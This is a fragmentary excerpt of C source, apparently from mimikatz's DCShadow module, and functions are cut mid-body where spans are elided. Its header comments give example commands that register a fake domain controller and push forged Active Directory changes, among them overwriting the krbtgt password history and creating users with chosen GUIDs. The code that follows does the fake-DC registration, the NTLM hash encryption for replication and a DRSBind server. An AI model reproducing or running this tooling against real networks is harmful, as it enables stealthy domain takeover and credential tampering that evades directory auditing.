...
// !processtoken
// lsadump::dcshadow /object:CN=krbtgt,CN=Users,DC=lab,DC=local /attribute:ntPwdHistory /value:00000000000000000000000000000000
//
// lsadump::dcshadow /push

// other examples:
// lsadump::dcshadow /object=CN=test,CN=Users,DC=test,DC=mysmartlogon,DC=com /attribute=description /value=tvps

// lsadump::dcshadow /object:CN=test2\0ADEL:15c09dc0-07ce-4aa2-82de-45cbb706f98b,CN=Deleted\20Objects,DC=test,DC=mysmartlogon,DC=com /attribute:whenChanged /value:2017-01-18

// lsadump::dcshadow /manualregister
// lsadump::dcshadow /manualpush
// lsadump::dcshadow /manualunregister

// lsadump::dcshadow /stack /object=CN=testAdd1,CN=Users,DC=test,DC=mysmartlogon,DC=com /attribute=objectClass /value=top
// lsadump::dcshadow /stack /object=CN=testAdd1,CN=Users,DC=test,DC=mysmartlogon,DC=com /attribute=objectClass /value=person /multiple
// lsadump::dcshadow /stack /object=CN=testAdd1,CN=Users,DC=test,DC=mysmartlogon,DC=com /attribute=objectClass /value=organizationalPerson /multiple
// lsadump::dcshadow /stack /object=CN=testAdd1,CN=Users,DC=test,DC=mysmartlogon,DC=com /attribute=objectClass /value=user /multiple
// lsadump::dcshadow /stack /object=CN=testAdd1,CN=Users,DC=test,DC=mysmartlogon,DC=com /attribute=objectGUID /value={39ab8618-d3fd-410c-b627-64b65104384d}
// lsadump::dcshadow /viewstack

static BOOL kuhl_m_lsadump_dcshadow_clean_push_request(PDCSHADOW_PUSH_REQUEST request)
{
	DWORD i, j, k;
	...
	if (request->cNumObjects != 0)
	{
		for (i = 0; i < request->cNumObjects; i++)
		{
			...
			{
				PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute = pObject->pAttributes + j;
...
static VOID kuhl_m_lsadump_dcshadow_clean_domain_info(PDCSHADOW_DOMAIN_INFO dif)
{
...
static BOOL kuhl_m_lsadump_dcshadow_remove_attribute(PDCSHADOW_PUSH_REQUEST request, PCWSTR szObject, PCWSTR szAttribute)
{
	DWORD i, j, k;
...
BOOL kuhl_m_lsadump_dcshadow_encode_attribute(PDCSHADOW_PUSH_REQUEST request, PCWSTR szAttribute, PDCSHADOW_OBJECT_ATTRIBUTE *pProperty)
{
	...
	for (i = 0; i < request->cNumAttributes; i++)
	{
		if (_wcsicmp(request->pAttributes[i].szAttributeName, szAttribute) == 0)
		{
...
{
	LPCWSTR szObject = NULL, szAttribute = NULL, szValue = NULL, szSid = NULL;
	LPCWSTR szReplOriginatingUid = NULL, szReplOriginatingUsn = NULL, szReplOriginatingTime = NULL;
	PDCSHADOW_PUSH_REQUEST_OBJECT pObject;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute;
	BOOL cleanData = kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL);
	BOOL multipleValues = kull_m_string_args_byName(argc, argv, L"multiple", NULL, NULL);
...
NTSTATUS kuhl_m_lsadump_dcshadow_view(PDCSHADOW_PUSH_REQUEST request)
{
	...
	kprintf(L"Number of objects: %u\n", request->cNumObjects);
	for(i = 0; i < request->cNumObjects; i++)
	{
		PDCSHADOW_PUSH_REQUEST_OBJECT pObject = request->pObjects + i;
		kprintf(L"\n");
		kprintf(L"Object Number: %u\n", i);
		kprintf(L"Object DN: %s\n", pObject->szObjectDN);
		kprintf(L"Number of attributes: %u\n", pObject->cbAttributes);
		for(j = 0; j < pObject->cbAttributes; j++)
		{
			PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute = pObject->pAttributes + j;
			kprintf(L"  Attribute: %s\n", pAttribute->pAttribute->szAttributeName);
			if (pAttribute->AttrVal.valCount == 0)
				kprintf(L"  Attribute empty (existing value will be removed)\n");
			else
			{
				kprintf(L"  Values:\n");
				for(k = 0; k < pAttribute->AttrVal.valCount; k++)
					kprintf(L"    %s\n", pAttribute->pszValue[k]);
			}
		}
	}
	return STATUS_SUCCESS;
...
{
	DWORD dwErr;
	PWCHAR serverAttr[] = {L"objectGUID", L"invocationId", NULL}, sitesBase, sitesFilter, serverBase;
...
BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainNamingContext, PDCSHADOW_PUSH_REQUEST_OBJECT object)
{
	...
	LDAPControl deletedControl = {L"1.2.840.113556.1.4.417", 0};
	...
	if(dwErr == LDAP_SUCCESS)
	{
		if(ldap_count_entries(ld, pMessage) == 1)
		{
			...
			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[3]))
			{
				...
				{
					p = wcsstr(p+1, L",CN=");
					if (p && kull_m_string_copy(&info->szDsServiceName, p))
...
/*
BOOL kuhl_m_lsadump_dcshadow_domaininfo_root(PLDAP ld, PDCSHADOW_DOMAIN_INFO info)
{
	DWORD dwErr;
	PWCHAR rootAttr[] = {L"dnsRoot", NULL};
	PLDAPMessage pMessage = NULL;
	PWSTR partitionFilter, partitionScope;
	if(kull_m_string_sprintf(&partitionFilter, L"(&(objectCategory=crossRef)(systemFlags:1.2.840.113556.1.4.803:=3)(nETBIOSName=*)(nCName=%s))", info->szDomainNamingContext))
	{
		if (kull_m_string_sprintf(&partitionScope, L"CN=Partitions,%s", info->szConfigurationNamingContext))
		{
			dwErr = ldap_search_sW(ld, partitionScope, LDAP_SCOPE_ONELEVEL, partitionFilter, rootAttr, FALSE, &pMessage);
			if(dwErr == LDAP_SUCCESS)
			{
				if(ldap_count_entries(ld, pMessage) == 1)
				{
					if(info->szDomainName = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[0]))
					{
						kprintf(L"domain: %s\n", info->szDomainName);
					}
				}
			...
			if(pMessage)
				ldap_msgfree(pMessage);
			LocalFree(partitionScope);
		}
		LocalFree(partitionFilter);
	}
	return (info->szDomainName != NULL);
}
*/
BOOL kuhl_m_lsadump_dcshadow_domaininfo_computer(PDCSHADOW_DOMAIN_INFO info, PLDAP ld)
{
	...
	if (kull_m_string_sprintf(&szComputerFilter, L"(&(|(objectClass=user)(objectClass=computer))(sAMAccountName=%s$))", info->szFakeDCNetBIOS))
	{
		...
		if (!(dwErr = ldap_search_s(ld, info->szDomainNamingContext, LDAP_SCOPE_SUBTREE, szComputerFilter, szComputerAttributes, FALSE, &pComputerSearchResult)))
		{
			...
			PRINT_ERROR(L"computer not found in AD 0x%x (%u)\n", dwErr, dwErr);
	}
		...
		if (!(dwErr = ldap_connect(ld, NULL)))
		{
			...
			if (!(dwErr = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)))
			{
				...
				if (fSuccess)
				{
					...
					ZeroMemory(&dif->mimiDc, sizeof(DCSHADOW_DOMAIN_DC_INFO));
					if (kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(ld, dif, dif->szFakeFQDN, &dif->mimiDc))
					{
						...
						kprintf(L"Fake Server (not already registered): %s\n", dif->szFakeFQDN);
					kprintf(L"\n");
				}
...
void kuhl_m_lsadump_dcshadow_encode_sensitive_value(BOOL fNTLM, DWORD dwRid, ATTRVAL *val, PSecPkgContext_SessionKey SessionKey)
{
	NTSTATUS status;
	PBYTE pbVal = val->pVal;
	DWORD dwSize, i;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL}, cryptoData;
	PENCRYPTED_PAYLOAD playload;
	BYTE data[LM_NTLM_HASH_LENGTH];

	
	dwSize = FIELD_OFFSET(ENCRYPTED_PAYLOAD,EncryptedData) + val->valLen;
	val->pVal = (PBYTE) MIDL_user_allocate(dwSize);
	if (!val->pVal)
	{
		val->pVal = pbVal;
		return;
	...
	playload = (PENCRYPTED_PAYLOAD) val->pVal;

	if (fNTLM)
	{
		if (val->valLen % LM_NTLM_HASH_LENGTH != 0)
		{
			PRINT_ERROR(L"unexpected ntlm hash len");
			val->pVal = pbVal;
			return;
		}
		
		for(i = 0; i < val->valLen; i+= LM_NTLM_HASH_LENGTH)
		{
			status = RtlEncryptDES2blocks1DWORD(pbVal + i * LM_NTLM_HASH_LENGTH, &dwRid, data);
			if (!NT_SUCCESS(status))
			{
				PRINT_ERROR(L"RtlEncryptDES2blocks1DWORD");
				val->pVal = pbVal;
				return;
			}
			RtlCopyMemory(playload->EncryptedData + i * LM_NTLM_HASH_LENGTH, data, LM_NTLM_HASH_LENGTH);
		}
	}
	else RtlCopyMemory(playload->EncryptedData, pbVal, val->valLen);

	// initkey
	CDGenerateRandomBits(playload->Salt, 16);
	if(kull_m_crypto_hash(CALG_CRC32, playload->EncryptedData, val->valLen, &playload->CheckSum, sizeof(DWORD)))
	{
		MD5Init(&md5ctx);
		MD5Update(&md5ctx, SessionKey->SessionKey, SessionKey->SessionKeyLength);
		MD5Update(&md5ctx, playload->Salt, 16);
		MD5Final(&md5ctx);
		cryptoKey.Buffer = md5ctx.digest;
	
		cryptoData.Length = cryptoData.MaximumLength = val->valLen + sizeof(DWORD);
		cryptoData.Buffer = (PBYTE) &playload->CheckSum;

		status = RtlEncryptDecryptRC4(&cryptoData, &cryptoKey);
		if (!NT_SUCCESS(status))
			PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", status);
		val->valLen = dwSize;
	}
}
...
BOOL WINAPI kuhl_m_lsadump_dcshadow_control_C(
...
NTSTATUS kuhl_m_lsadump_dcshadow(int argc, wchar_t * argv[])
{
	...
	else
	{
		...
		if (NT_SUCCESS(status) && (!fStartServer || (fViewReplicationOnly || stackedRequest.cNumObjects > 0 )))
		{
			...
			PRINT_ERROR(L"no object to push");
...
ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer, DRS_HANDLE *phDrs)
{
	...
	if(pextClient && ppextServer && phDrs && ((PDRS_EXTENSIONS_INT) pextClient)->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD))
	{
		if(((PDRS_EXTENSIONS_INT) pextClient)->dwFlags & DRS_EXT_GETCHGREPLY_V6)
		{
			...
			{
				if(*ppextServer = (DRS_EXTENSIONS *) midl_user_allocate(FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid)))
				{
					((PDRS_EXTENSIONS_INT) *ppextServer)->cb = FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD);
